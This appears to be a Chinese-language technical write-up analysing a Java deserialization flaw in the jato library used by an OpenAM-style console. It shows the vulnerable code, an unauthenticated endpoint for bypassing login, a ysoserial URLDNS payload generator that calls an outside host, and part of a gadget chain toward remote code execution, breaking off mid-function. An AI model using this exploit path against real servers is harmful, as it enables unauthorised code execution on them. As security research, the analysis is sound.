第一种，直接terminal命令。
    $ java -cp "java-decompiler.jar位置" org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true "要反编译的jar" "存放的文件夹位置"
但我嫌麻烦，我用了第二种。
第二种，直接打开IDEA，选中一个jar，右击-`Add as Library...`就能够反编译。
找到jato-2005-05-04.jar，在com/iplanet.jato/view/下找到了ViewBeanBase.class
    protected void deserializePageAttributes() {
        if (!this.isPageSessionDeserialized()) {
            RequestContext context = this.getRequestContext();
            if (context == null) {
                context = RequestManager.getRequestContext();
            }
            String pageAttributesParam = context.getRequest().getParameter("jato.pageSession");
            if (pageAttributesParam != null && pageAttributesParam.trim().length() > 0) {
                try {
     //vul
               this.setPageSessionAttributes((Map)Encoder.deserialize(Encoder.decodeHttp64(pageAttributesParam), false));
                } catch (Exception var4) {
                    this.handleDeserializePageAttributesException(var4);
                }
            }
            this.setPageSessionDeserialized();
        }
    }
这表示，如果我们的get请求中包含了jato.pageSession的参数，jato会将其反序列化成为一个会话，而恰恰这里没有经过任何的过滤，直接使用了我们前置知识中讲到的原生
Java 序列化 ObjectInputSteam ，然后在头部进行了压缩。
那么梳理一下，如果要利用，既要搞清楚怎么压缩，然后考虑怎么绕过验证，最后能够RCE。
如果要利用就得搞清楚压缩的机制才可以，但有更简单的方法，将jato-2005-05-04.jar 和 ysoserial.jar
作为库包含。至于绕过验证，其实阅读XML会发现不少地方使用了jato，我们可以找到ccversion/Version是可行无需认证就可以访问的。
        jato:com.sun.identity.console.version.*:moduleURL
        ../ccversion
    String windowTitle = resourceBundle.getString("masthead.versionWindowTitle");
    // Get query parameters.
    String productNameSrc = (request.getParameter("productNameSrc") != null)
    ? request.getParameter("productNameSrc") : "";
    String versionFile = (request.getParameter("versionFile") != null)
    ? request.getParameter("versionFile") : "";
    windowTitle = VersionViewBean.escapeHTML(windowTitle);
    String productNameHeight =
    (request.getParameter("productNameHeight") != null)
        ? request.getParameter("productNameHeight") : "";
    String productNameWidth =
    (request.getParameter("productNameWidth") != null)
        ? request.getParameter("productNameWidth") : "";
    // Create button frame URL.
    StringBuilder buttonBuffer =
        new StringBuilder(request.getContextPath())
        .append("/ccversion/ButtonFrame");
    // Create masthead frame URL.
    StringBuilder buffer =
        new StringBuilder(request.getContextPath())
        .append("/ccversion/Masthead.jsp?");
按照 Michael Stepankin 的方法，这种负载就可以完成urlDNS的跳转。
    import com.iplanet.jato.util.Encoder;
    import ysoserial.payloads.URLDNS;
    import java.io.Serializable;
    public class Main {
      public static void main(String[] args) throws Exception {
        Object payload = new URLDNS().getObject("http://xxx4.x.artsploit.com/");
        byte[] payloadBytes = Encoder.serialize((Serializable) payload, false);
        String payloadString = Encoder.encodeHttp64(payloadBytes, 1000000);
        System.out.println(payloadString);
      }
    }
其实这个分析到这里就差不多结束了，使用ysoserial 的 CommonsBeanutils1 小工具链可以RCE。但是为什么这个漏洞被评价很高呢？
是因为作者在实际目标中发现URLDNS 和 CommonsBeanutils1并不能达到效果，也就没办法完成通杀，所以作者考虑了其他办法。
2015 年，[@frohoff](https://github.com/frohoff "@frohoff") 和
[@gebl](https://github.com/gebl "@gebl") 展示了几种从公共库中的 readObject
方法触发远程代码执行的方法，包括广泛使用的 Apache Commons Collections。Apache Commons Collections
是一个扩展了Java标准库里的Collection结构的第三方基础库。也就是说我们可以通过给反序列化发送任意类对象触发 readObject
方法来达到自定义工具链的攻击模式。
JackOfMostTrades的gadgetinspector可以帮助我们静态分析jar包找到利用漏洞链，使用它可以找到13个链。
    java/security/cert/CertificateRevokedException.readObject()
      java/util/TreeMap.put()
       org/apache/click/control/Column$ColumnComparator.compare()
        org/apache/click/control/Column.getProperty()
         org/apache/click/control/Column.getProperty()
          org/apache/click/util/PropertyUtils.getValue()
           org/apache/click/util/PropertyUtils.getObjectPropertyValue()
            java/lang/reflect/Method.invoke()
我们关注倒数第二条链。找到click-nodeps-2.3.0.jar，进入org/apache/click/util/PropertyUtils，找到关键函数getObjectPropertyValue()。
    private static Object getObjectPropertyValue(Object source, String name, Map cache) {
        PropertyUtils.CacheKey methodNameKey = new PropertyUtils.CacheKey(source, name);
        Method method = null;
        try {
            method = (Method) cache.get(methodNameKey);